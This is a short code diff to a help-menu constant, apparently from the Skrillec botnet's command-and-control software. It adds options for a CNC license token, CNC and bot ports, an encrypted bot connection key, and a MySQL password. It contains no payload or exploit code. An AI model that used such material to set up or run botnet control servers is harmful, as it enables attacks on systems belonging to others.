@@ -49,7 +49,10 @@ pub const (
 
     Help_MENU        = "      Tools              Description
 _______________________________________________
-      -p                 PORT
+      -t                 Skrillec CNC License Token [REQUIRED]
+      -p                 CNC Port [REQUIRED]
+      -b_port            Bot Port
+      -b_key             Bot connecting Password (Encrypted Key)
       -sqlpw             Set MySQL Passowrd [REQUIRED]"
 )
 
